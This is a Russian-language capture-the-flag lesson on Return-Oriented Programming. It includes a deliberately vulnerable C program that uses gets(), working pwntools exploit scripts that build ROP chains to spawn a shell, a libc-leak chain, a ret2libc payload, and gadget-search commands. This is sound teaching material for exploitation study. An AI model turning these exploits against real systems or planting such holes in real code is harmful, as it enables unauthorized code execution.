## Вопрос, с которого всё начинается

Мы научились писать shellcode, но NX запрещает исполнять стек — свой код не запустить. А что, если функции `win` в бинаре тоже нет? Значит, ни вернуться в готовую функцию, ни выполнить свой код нельзя.

Выход придумали элегантный: не писать новый код, а **собирать программу из кусочков уже существующего**. Эту технику называют **ROP** — Return-Oriented Programming, программирование на возвратах.

## Наш пример: NX включён, win принимает аргумент

```c
// vuln.c
#include <stdio.h>
#include <stdlib.h>
void win(unsigned int x) {
    if (x == 0xdeadbeef) system("/bin/sh");
}
int main(void) {
    char buf[64];
    gets(buf);
    return 0;
}
```

```bash
$ gcc -fno-stack-protector -no-pie -o vuln vuln.c
$ checksec --file=./vuln
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

NX включён — shellcode отпадает. Но `win` требует аргумент `0xdeadbeef`. Как передать аргумент через переполнение? Это уже задача для ROP.

## Шаг 1. Идея: собираем программу из чужих кусочков

Вспомним два факта из прошлых уроков:

1. `ret` берёт со стека 8 байт и прыгает по этому адресу.
2. Первый аргумент функции лежит в регистре `rdi`.

А теперь главное наблюдение: в любом бинаре есть короткие последовательности инструкций, заканчивающиеся на `ret`. Например, `pop rdi; ret` кладёт со стека число в `rdi` и возвращается дальше. Такие кусочки называют **гаджетами**.

Если выложить на стек цепочку адресов гаджетов, процессор, выполняя `ret` за `ret`, будет переходить от одного гаджета к другому, как по эстафете. Это и есть ROP-цепочка.

## Шаг 2. Ищем гаджеты

Гаджеты ищут специальными утилитами. `ROPgadget` — самая популярная:

```bash
$ ROPgadget --binary ./vuln | grep "pop rdi"
0x000000000040123b : pop rdi ; ret
```

Если нужен не только `rdi`, но и `rsi`, `rdx`, ищем их отдельно:

```bash
$ ROPgadget --binary ./vuln | grep -E "pop rsi|pop rdx"
0x0000000000401239 : pop rsi ; pop r15 ; ret
```

У pwntools есть свой поиск — модуль `ROP`, который сразу собирает цепочку:

```python
>>> from pwn import *
>>> elf = ELF('./vuln')
>>> rop = ROP(elf)
>>> rop.call('win', [0xdeadbeef])
>>> print(rop.dump())
0x0000:         0x40123b pop rdi; ret
0x0008:         0xdeadbeef
0x0010:         0x4011a6 win
```

Библиотека сама нашла гаджет и разложила аргумент. Строка `0x0000: 0x40123b pop rdi; ret` означает: «на смещении 0 в цепочке — адрес гаджета».

## Шаг 3. Собираем цепочку вручную

Покажем ту же цепочку руками, чтобы видеть, как это устроено. Смещение до возврата — 72 (буфер 64 + `rbp` 8).

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')
OFFSET   = 72
pop_rdi  = 0x40123b          # из ROPgadget
win      = elf.symbols['win']

p = process('./vuln')
payload  = b'A' * OFFSET
payload += p64(pop_rdi)      # 1) ret -> гаджет
payload += p64(0xdeadbeef)   # 2) pop rdi заберёт это в rdi
payload += p64(win)          # 3) ret -> win с готовым аргументом
p.sendline(payload)
p.interactive()
```

```bash
$ python3 exp.py
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user)
```

Цепочка сработала: `rdi` получил `0xdeadbeef`, и `win` открыла shell.

## Шаг 4. Цепочка подлиннее: несколько вызовов

ROP хорош тем, что цепочку можно продолжать. Например, сначала прочитать память через `puts`, а потом вернуться в `main` и переполнить снова:

```python
payload  = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])   # аргумент для puts
payload += p64(elf.plt['puts'])   # вызов puts(addr) -> утечка libc
payload += p64(elf.symbols['main'])  # вернуться в main
```

Здесь `puts` напечатает содержимое GOT-записи — это адрес `puts` в libc. Зная его, вычисляют базу libc и обходят ASLR. Затем управление возвращается в `main`, и мы можем построить вторую цепочку, уже с точными адресами.

Порядок элементов на стеке — это и есть порядок выполнения. Читается сверху вниз, как программа.

## Шаг 5. ret2libc, когда win нет вовсе

Если в бинаре нет ни `win`, ни `system`, идём в libc. Функция `system` там точно есть. Схема:

1. Утечкой узнать адрес любой функции libc (например, `puts`).
2. По нему вычислить базу libc: `base = leak - libc.symbols['puts']`.
3. Найти адрес `system` и строки `/bin/sh` в libc.
4. Построить цепочку: `pop rdi; ret` → адрес `/bin/sh` → `system`.

```python
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
system = base + libc.symbols['system']
binsh  = base + next(libc.search(b'/bin/sh'))
payload = b'A'*OFFSET + p64(pop_rdi) + p64(binsh) + p64(system)
```

Эту технику подробно разберём в уроке `pwn-ret2libc`.

## Шаг 6. Отладка цепочки

ROP-цепочки ломаются легко: один неверный адрес — и падаем в случайное место. Лучший инструмент — GDB. Ставим брейкпоинт на `ret` в `main` и смотрим стек:

```bash
(gdb) b *main+80
(gdb) c
(gdb) telescope $rsp 6
00:0000│ rsp 0x...3a0 ◂— 0x40123b          # pop rdi; ret
01:0008│     0x...3a8 ◂— 0xdeadbeef
02:0010│     0x...3b0 ◂— 0x4011a6          # win
```

Если цепочка разложена верно, в стеке видно адреса гаджетов и аргументов. Если нет — правь смещение или порядок.

## Как выбрать гаджет

Гаджетов в бинаре тысячи, но подходят не все. Правила выбора:

1. **Гаджет должен заканчиваться на `ret`** — иначе цепочка не продолжится.
2. **Между гаджетами не должно быть «мусорных» инструкций**, которые испортят состояние (например, `pop rbp` перезапишет регистр).
3. **Адрес гаджета не должен содержать запрещённых байтов** (`\x00`, `\n`), если ввод их обрезает.
4. **Чем короче гаджет — тем лучше**: меньше шансов, что он что-то сломает.

Команды для поиска под конкретную задачу:

| Задача | Команда |
|---|---|
| все гаджеты | `ROPgadget --binary ./vuln` |
| только `ret` | `ROPgadget --binary ./vuln --only "ret"` |
| запись в `rdi` | `ROPgadget --binary ./vuln --only "pop\|ret" \| grep rdi` |
| без плохих байтов | `ROPgadget --binary ./vuln --badbytes 000a` |
| автоматическая цепочка | `ROP(elf).call('func', [args])` |
| готовый shell в libc | `one_gadget /lib/x86_64-linux-gnu/libc.so.6` |

Если подходящего гаджета нет, ищут «составной» — например, `pop rsi; pop r15; ret` и просто кладут в стек лишнее значение, которое уйдёт в `r15`.

## Инструмент: nm — таблица символов

`nm` перечисляет символы бинарника: имена функций и глобальных переменных с их адресами. Если символы не срезаны, это самый быстрый способ найти нужную функцию.

Ключи, которые пригодятся:
* `nm <файл>` — все символы с адресами;
* `nm -C <файл>` — демутируй C++-имена (читаемые сигнатуры);
* `T`/`t` — код (глобальный/локальный), `R`/`r` — только чтение (`.rodata`), `D`/`B` — данные;
* нижний регистр = локальный символ, верхний = глобальный/экспортируемый.

### Рабочий пример (как в лаборатории)

```
$ nm vuln
0000000000403000 R __bss_start
0000000000403000 R _edata
0000000000403000 R _end
0000000000401050 T _start
0000000000401000 t sys
0000000000401030 T win
```

Подсказка из лаборатории: `nm <файл>`.

## Инструмент: objdump — дизассемблер

`objdump` показывает машинный код бинарника в виде ассемблера. Именно по нему считают смещения буферов, находят вызовы и адреса — основа статического разбора.

Ключи, которые пригодятся:
* `objdump -d <файл>` — дизассемблировать секцию `.text` (машинный код функций);
* `objdump -d <файл> | less` — листать вывод, искать нужную функцию по имени;
* `objdump -M intel -d <файл>` — синтаксис Intel (привычнее, чем AT&T);
* в выводе важны пролог функции (`push rbp; mov rbp,rsp`) и `sub rsp,N` — по нему видно размер кадра.

## Что мы теперь знаем

- ROP обходит NX, не выполняя свой код, а комбинируя существующие гаджеты.
- Гаджет — короткий код на `ret`; `pop rdi; ret` кладёт аргумент в `rdi`.
- Цепочка — это адреса гаджетов и данных, выложенные на стек в порядке выполнения.
- `ROPgadget` ищет гаджеты, `ROP(elf)` собирает цепочку автоматически.
- Несколько вызовов в одной цепочке позволяют сначала утечь адрес, потом вернуться и продолжить.
- ret2libc: утечка → база libc → `system("/bin/sh")`.

## Куда дальше

ROP — универсальный инструмент: им решается большинство задач с NX. Но адреса libc мы пока брали «на глаз». В уроке `pwn-ret2libc` разберём, как надёжно определить версию libc по утечке и собрать цепочку `system("/bin/sh")` даже без `win`. Запомни главное: **ROP — это программа, собранная из чужих кусочков; порядок адресов на стеке — порядок выполнения.**

## Где пригодится

- **CTF Pwn:** ROP — обязательный навык; без него не решить задачи с NX.
- **Обход NX/DEP:** тот же принцип применяется на Windows (DEP) и в браузерах.
- **Vulnerability research:** современные цепочки — это длинные ROP-последовательности.
- **Реальные CVE:** эксплуатация ядра и браузеров часто строится на ROP/JOP.
